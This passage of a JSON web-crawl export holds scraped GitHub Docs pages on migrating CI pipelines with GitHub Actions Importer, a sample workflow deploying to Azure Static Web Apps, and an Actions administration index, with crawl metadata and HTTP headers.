GitHub Actions workflow and open a pull request with the changes. jenkins Convert a Jenkins job to a GitHub Actions workflow and open a pull request with the changes. travis-ci Convert a Travis CI pipeline to a GitHub Actions workflow and open a pull request with the changes. \nPerforming self-serve migrations using IssueOps\nYou can use GitHub Actions and GitHub Issues to run CLI commands for GitHub Actions Importer. This allows you to migrate your CI/CD workflows without installing software on your local machine. This approach is especially useful for organizations that want to enable self-service migrations to GitHub Actions. Once IssueOps is configured, users can open an issue with the relevant template to migrate pipelines to GitHub Actions.\nFor more information about setting up self-serve migrations with IssueOps, see the actions/importer-issue-ops template repository.\nUsing the GitHub Actions Importer labs repository\nThe GitHub Actions Importer labs repository contains platform-specific learning paths that teach you how to use GitHub Actions Importer and how to approach migrations to GitHub Actions. You can use this repository to learn how to use GitHub Actions Importer to help plan, forecast, and automate your migration to GitHub Actions.\nTo learn more, see the GitHub Actions Importer labs repository.\nLegal notice\nPortions have been adapted from https://github.com/github/gh-actions-importer/ under the MIT license:\nMIT License Copyright (c) 2022 GitHub Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-automating-migration-with-github-a-j10uz.html",
  "markdown": "# Automating migration with GitHub Actions Importer\n\nUse GitHub Actions Importer to plan and automate your migration to GitHub Actions.\n\n[Legal notice](#legal-notice)\n\n## [About GitHub Actions Importer](#about-github-actions-importer)\n\nYou can use GitHub Actions Importer to plan and automatically migrate your CI/CD supported pipelines to GitHub Actions.\n\nGitHub Actions Importer is distributed as a Docker container, and uses a [GitHub CLI](https://cli.github.com/) extension to interact with the container.\n\nAny workflow that is converted by the GitHub Actions Importer should be inspected for correctness before using it as a production workload. The goal is to achieve an 80% conversion rate for every workflow, however, the actual conversion rate will depend on the makeup of each individual pipeline that is converted.\n\n## [Supported CI platforms](#supported-ci-platforms)\n\nYou can use GitHub Actions Importer to migrate from the following platforms:\n\n*   Azure DevOps\n*   Bamboo\n*   Bitbucket Pipelines\n*   CircleCI\n*   GitLab (both cloud and self-hosted)\n*   Jenkins\n*   Travis CI\n\n## [Prerequisites](#prerequisites)\n\nGitHub Actions Importer has the following requirements:\n\n*   An environment where you can run Linux-based containers, and can install the necessary tools.\n    \n    *   Docker is [installed](https://docs.docker.com/get-docker/) and running.\n        \n    *   [GitHub CLI](https://cli.github.com/) is installed.\n        \n    \n    Note\n    \n    The GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.\n    \n\n### [Installing the GitHub Actions Importer CLI extension](#installing-the-github-actions-importer-cli-extension)\n\n1.  Install the GitHub Actions Importer CLI extension:\n    \n    Bash\n    \n    ```\n    gh extension install github/gh-actions-importer\n    ```\n    \n2.  Verify that the extension is installed:\n    \n    ```\n    $ gh actions-importer -h\n    Options:\n      -?, -h, --help  Show help and usage information\n    \n    Commands:\n      update     Update to the latest version of GitHub Actions Importer.\n      version    Display the version of GitHub Actions Importer.\n      configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n      audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n      forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n      dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n      migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes.\n    ```\n    \n\n### [Updating the GitHub Actions Importer CLI](#updating-the-github-actions-importer-cli)\n\nTo ensure you're running the latest version of GitHub Actions Importer, you should regularly run the `update` command:\n\n```\ngh actions-importer update\n```\n\n### [Authenticating at the command line](#authenticating-at-the-command-line)\n\nYou must configure credentials that allow GitHub Actions Importer to communicate with GitHub and your current CI server. You can configure these credentials using environment variables or a `.env.local` file. The environment variables can be configured in an interactive prompt, by running the following command:\n\n```\ngh actions-importer configure\n```\n\n## [Using the GitHub Actions Importer CLI](#using-the-github-actions-importer-cli)\n\nUse the subcommands of `gh actions-importer` to begin your migration to GitHub Actions, including `audit`, `forecast`, `dry-run`, and `migrate`.\n\n### [Auditing your existing CI pipelines](#auditing-your-existing-ci-pipelines)\n\nThe `audit` subcommand can be used to plan your CI/CD migration by analyzing your current CI/CD footprint. This analysis can be used to plan a timeline for migrating to GitHub Actions.\n\nTo run an audit, use the following command to determine your available options:\n\n```\n$ gh actions-importer audit -h\nDescription:\n  Plan your CI/CD migration by analyzing your current CI/CD footprint.\n\n[...]\n\nCommands:\n  azure-devops  An audit will output a list of data used in an Azure DevOps instance.\n  bamboo        An audit will output a list of data used in a Bamboo instance.\n  circle-ci     An audit will output a list of data used in a CircleCI instance.\n  gitlab        An audit will output a list of data used in a GitLab instance.\n  jenkins       An audit will output a list of data used in a Jenkins instance.\n  travis-ci     An audit will output a list of data used in a Travis CI instance.\n```\n\n### [Forecasting usage](#forecasting-usage)\n\nThe `forecast` subcommand reviews historical pipeline usage to create a forecast of GitHub Actions usage.\n\nTo run a forecast, use the following command to determine your available options:\n\n```\n$ gh actions-importer forecast -h\nDescription:\n  Forecasts GitHub Actions usage from historical pipeline utilization.\n\n[...]\n\nCommands:\n  azure-devops  Forecasts GitHub Actions usage from historical Azure DevOps pipeline utilization.\n  bamboo        Forecasts GitHub Actions usage from historical Bamboo pipeline utilization.\n  jenkins       Forecasts GitHub Actions usage from historical Jenkins pipeline utilization.\n  gitlab        Forecasts GitHub Actions usage from historical GitLab pipeline utilization.\n  circle-ci     Forecasts GitHub Actions usage from historical CircleCI pipeline utilization.\n  travis-ci     Forecasts GitHub Actions usage from historical Travis CI pipeline utilization.\n  github        Forecasts GitHub Actions usage from historical GitHub pipeline utilization.\n```\n\n### [Testing the migration process](#testing-the-migration-process)\n\nThe `dry-run` subcommand can be used to convert a pipeline to its GitHub Actions equivalent, and then write the workflow to your local filesystem.\n\nTo perform a dry run, use the following command to determine your available options:\n\n```\n$ gh actions-importer dry-run -h\nDescription:\n  Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n\n[...]\n\nCommands:\n  azure-devops  Convert an Azure DevOps pipeline to a GitHub Actions workflow and output its yaml file.\n  bamboo        Convert a Bamboo pipeline to GitHub Actions workflows and output its yaml file.\n  circle-ci     Convert a CircleCI pipeline to GitHub Actions workflows and output the yaml file(s).\n  gitlab        Convert a GitLab pipeline to a GitHub Actions workflow and output the yaml file.\n  jenkins       Convert a Jenkins job to a GitHub Actions workflow and output its yaml file.\n  travis-ci     Convert a Travis CI pipeline to a GitHub Actions workflow and output its yaml file.\n```\n\n### [Migrating a pipeline to GitHub Actions](#migrating-a-pipeline-to-github-actions)\n\nThe `migrate` subcommand can be used to convert a pipeline to its GitHub Actions equivalent and then create a pull request with the contents.\n\nTo run a migration, use the following command to determine your available options:\n\n```\n$ gh actions-importer migrate -h\nDescription:\n  Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes.\n\n[...]\n\nCommands:\n  azure-devops  Convert an Azure DevOps pipeline to a GitHub Actions workflow and open a pull request with the changes.\n  bamboo        Convert a Bamboo pipeline to GitHub Actions workflows and open a pull request with the changes.\n  circle-ci     Convert a CircleCI pipeline to GitHub Actions workflows and open a pull request with the changes.\n  gitlab        Convert a GitLab pipeline to a GitHub Actions workflow and open a pull request with the changes.\n  jenkins       Convert a Jenkins job to a GitHub Actions workflow and open a pull request with the changes.\n  travis-ci     Convert a Travis CI pipeline to a GitHub Actions workflow and open a pull request with the changes.\n```\n\n## [Performing self-serve migrations using IssueOps](#performing-self-serve-migrations-using-issueops)\n\nYou can use GitHub Actions and GitHub Issues to run CLI commands for GitHub Actions Importer. This allows you to migrate your CI/CD workflows without installing software on your local machine. This approach is especially useful for organizations that want to enable self-service migrations to GitHub Actions. Once IssueOps is configured, users can open an issue with the relevant template to migrate pipelines to GitHub Actions.\n\nFor more information about setting up self-serve migrations with IssueOps, see the [`actions/importer-issue-ops`](https://github.com/actions/importer-issue-ops) template repository.\n\n## [Using the GitHub Actions Importer labs repository](#using-the-github-actions-importer-labs-repository)\n\nThe GitHub Actions Importer labs repository contains platform-specific learning paths that teach you how to use GitHub Actions Importer and how to approach migrations to GitHub Actions. You can use this repository to learn how to use GitHub Actions Importer to help plan, forecast, and automate your migration to GitHub Actions.\n\nTo learn more, see the [GitHub Actions Importer labs repository](https://github.com/actions/importer-labs/tree/main#readme).\n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/github/gh-actions-importer/](https://github.com/github/gh-actions-importer/) under the MIT license:\n\n```\nMIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 255,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-automating-migration-with-github-a",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-automating-migration-with-github-a",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-automating-migration-with-github-a",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-automating-migration-with-github-a",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-automating-migration-with-github-a"
    },
    "lengths": {
      "extractus": 14481,
      "readableText": 12131,
      "none": 35148,
      "readableTextIfPossible": 12131,
      "result": 12131,
      "markdown": 10325
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-static-web-app",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-static-web-app",
    "loadedTime": "2025-05-08T06:40:23.523Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-static-web-app",
    "title": "Deploying to Azure Static Web App - GitHub Docs",
    "description": "You can deploy your web app to Azure Static Web App as part of your continuous deployment (CD) workflows.",
    "author": null,
    "keywords": "CD,Azure Static Web Apps",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Deploying to Azure Static Web App - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-static-web-app"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-static-web-app"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "DCA2:166634:1B734:2275A:681C51D0",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:17 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686417.717008, VS0, VE397",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28021",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Deploying to Azure Static Web App\nYou can deploy your web app to Azure Static Web App as part of your continuous deployment (CD) workflows.\nIntroduction\nThis guide explains how to use GitHub Actions to build and deploy a web app to Azure Static Web Apps.\nNote\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see About security hardening with OpenID Connect. and Configuring OpenID Connect in Azure.\nPrerequisites\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\nCreate an Azure Static Web App using the 'Other' option for deployment source. For more information, see Quickstart: Building your first static site in the Azure portal in the Azure documentation.\nCreate a secret called AZURE_STATIC_WEB_APPS_API_TOKEN with the value of your static web app deployment token. For more information about how to find your deployment token, see Reset deployment tokens in Azure Static Web Apps in the Azure documentation.\nCreating the workflow\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\nThe following example workflow demonstrates how to build and deploy an Azure static web app when there is a push to the main branch or when a pull request targeting main is opened, synchronized, or reopened. The workflow also tears down the corresponding pre-production deployment when a pull request targeting main is closed.\nUnder the workflow env key, change the following values:\nAPP_LOCATION to the location of your client code\nAPI_LOCATION to the location of your API source code. If API_LOCATION is not relevant, you can delete the variable and the lines where it is used.\nOUTPUT_LOCATION to the location of your client code build output\nFor more information about these values, see Build configuration for Azure Static Web Apps in the Azure documentation.\nYAML\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Deploy web app to Azure Static Web Apps env: APP_LOCATION: \"/\" # location of your client code API_LOCATION: \"api\" # location of your api source code - optional OUTPUT_LOCATION: \"build\" # location of client code build output on: push: branches: - main pull_request: types: [opened, synchronize, reopened, closed] branches: - main permissions: issues: write contents: read pull-requests: write jobs: build_and_deploy: if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed') runs-on: ubuntu-latest name: Build and Deploy steps: - uses: actions/checkout@v4 with: submodules: true - name: Build And Deploy uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9 with: azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }} repo_token: ${{ secrets.GITHUB_TOKEN }} action: \"upload\" app_location: ${{ env.APP_LOCATION }} api_location: ${{ env.API_LOCATION }} output_location: ${{ env.OUTPUT_LOCATION }} close_pull_request: if: github.event_name == 'pull_request' && github.event.action == 'closed' runs-on: ubuntu-latest name: Close Pull Request steps: - name: Close Pull Request uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9 with: azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }} action: \"close\" \nAdditional resources\nThe following resources may also be useful:\nFor the original workflow template, see azure-staticwebapp.yml in the GitHub Actions starter-workflows repository.\nThe action used to deploy the web app is the official Azure Azure/static-web-apps-deploy action.\nFor more examples of GitHub Action workflows that deploy to Azure, see the actions-workflow-samples repository.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-static-web-app-e07sk.html",
  "markdown": "# Deploying to Azure Static Web App\n\nYou can deploy your web app to Azure Static Web App as part of your continuous deployment (CD) workflows.\n\n## [Introduction](#introduction)\n\nThis guide explains how to use GitHub Actions to build and deploy a web app to [Azure Static Web Apps](https://azure.microsoft.com/services/app-service/static/).\n\nNote\n\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect). and [Configuring OpenID Connect in Azure](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure).\n\n## [Prerequisites](#prerequisites)\n\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\n\n1.  Create an Azure Static Web App using the 'Other' option for deployment source. For more information, see [Quickstart: Building your first static site in the Azure portal](https://docs.microsoft.com/azure/static-web-apps/get-started-portal) in the Azure documentation.\n    \n2.  Create a secret called `AZURE_STATIC_WEB_APPS_API_TOKEN` with the value of your static web app deployment token. For more information about how to find your deployment token, see [Reset deployment tokens in Azure Static Web Apps](https://docs.microsoft.com/azure/static-web-apps/deployment-token-management) in the Azure documentation.\n    \n\n## [Creating the workflow](#creating-the-workflow)\n\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\n\nThe following example workflow demonstrates how to build and deploy an Azure static web app when there is a push to the `main` branch or when a pull request targeting `main` is opened, synchronized, or reopened. The workflow also tears down the corresponding pre-production deployment when a pull request targeting `main` is closed.\n\nUnder the workflow `env` key, change the following values:\n\n*   `APP_LOCATION` to the location of your client code\n*   `API_LOCATION` to the location of your API source code. If `API_LOCATION` is not relevant, you can delete the variable and the lines where it is used.\n*   `OUTPUT_LOCATION` to the location of your client code build output\n\nFor more information about these values, see [Build configuration for Azure Static Web Apps](https://docs.microsoft.com/azure/static-web-apps/build-configuration?tabs=github-actions) in the Azure documentation.\n\nYAML\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Deploy web app to Azure Static Web Apps\n\nenv:\n  APP_LOCATION: \"/\" # location of your client code\n  API_LOCATION: \"api\" # location of your api source code - optional\n  OUTPUT_LOCATION: \"build\" # location of client code build output\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    types: [opened, synchronize, reopened, closed]\n    branches:\n      - main\n\npermissions:\n  issues: write\n  contents: read\n  pull-requests: write\n\njobs:\n  build_and_deploy:\n    if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')\n    runs-on: ubuntu-latest\n    name: Build and Deploy\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          submodules: true\n      - name: Build And Deploy\n        uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9\n        with:\n          azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}\n          repo_token: ${{ secrets.GITHUB_TOKEN }}\n          action: \"upload\"\n          app_location: ${{ env.APP_LOCATION }}\n          api_location: ${{ env.API_LOCATION }}\n          output_location: ${{ env.OUTPUT_LOCATION }}\n\n  close_pull_request:\n    if: github.event_name == 'pull_request' && github.event.action == 'closed'\n    runs-on: ubuntu-latest\n    name: Close Pull Request\n    steps:\n      - name: Close Pull Request\n        uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9\n        with:\n          azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}\n          action: \"close\"\n```\n\n## [Additional resources](#additional-resources)\n\nThe following resources may also be useful:\n\n*   For the original workflow template, see [`azure-staticwebapp.yml`](https://github.com/actions/starter-workflows/blob/main/deployments/azure-staticwebapp.yml) in the GitHub Actions `starter-workflows` repository.\n*   The action used to deploy the web app is the official Azure [`Azure/static-web-apps-deploy`](https://github.com/Azure/static-web-apps-deploy) action.\n*   For more examples of GitHub Action workflows that deploy to Azure, see the [actions-workflow-samples](https://github.com/Azure/actions-workflow-samples) repository.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 244,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-static-web-app-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-static-web-app-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-static-web-app-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-static-web-app-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-static-web-app-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 8367,
      "readableText": 8054,
      "none": 32847,
      "readableTextIfPossible": 32847,
      "result": 8054,
      "markdown": 5432
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/administering-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/administering-github-actions",
    "loadedTime": "2025-05-08T06:40:22.621Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/administering-github-actions",
    "title": "Administering GitHub Actions - GitHub Docs",
    "description": "Manage GitHub Actions settings for your organization or enterprise.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Administering GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/administering-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/administering-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "93B5:22AEEF:1C23F:239D4:681C51CF",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "date": "Thu, 08 May 2025 06:40:15 GMT",
      "via": "1.1 varnish",
      "age": "0",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686415.129215, VS0, VE231",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "22832",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Administering GitHub Actions - GitHub Docs\nManage GitHub Actions settings for your organization or enterprise.\nUsage limits, billing, and administration\nThere are usage limits for GitHub Actions workflows. Usage charges apply to repositories that go beyond the amount of free minutes and storage for a repository.\nViewing GitHub Actions metrics\nYou can view metrics to monitor where your organization or repositories use GitHub Actions and how they are performing.\nSharing workflows, secrets, and runners with your organization\nLearn how you can use organization features to collaborate with your team, by sharing workflow templates, secrets, variables, and self-hosted runners.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-administering-github-actions-3bo4.html",
  "markdown": "# Administering GitHub Actions - GitHub Docs\n\nManage GitHub Actions settings for your organization or enterprise.\n\n## [Usage limits, billing, and administration](https://docs.github.com/en/actions/administering-github-actions/usage-limits-billing-and-administration)\n\nThere are usage limits for GitHub Actions workflows. Usage charges apply to repositories that go beyond the amount of free minutes and storage for a repository.\n\n## [Viewing GitHub Actions metrics](https://docs.github.com/en/actions/administering-github-actions/viewing-github-actions-metrics)\n\nYou can view metrics to monitor where your organization or repositories use GitHub Actions and how they are performing.\n\n## [Sharing workflows, secrets, and runners with your organization](https://docs.github.com/en/actions/administering-github-actions/sharing-workflows-secrets-and-runners-with-your-organization)\n\nLearn how you can use organization features to collaborate with your team, by sharing workflow templates, secrets, variables, and self-hosted runners.",
  "debug": {
    "pageType": "Category",
    "pageTypeReason": "None",
    "totalLinks": 226,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-administering-github-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-administering-github-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-administering-github-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-administering-github-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-administering-github-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 1164,
      "readableText": 1471,
      "none": 19976,
      "readableTextIfPossible": 19976,
      "result": 1471,
      "markdown": 1029
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does",
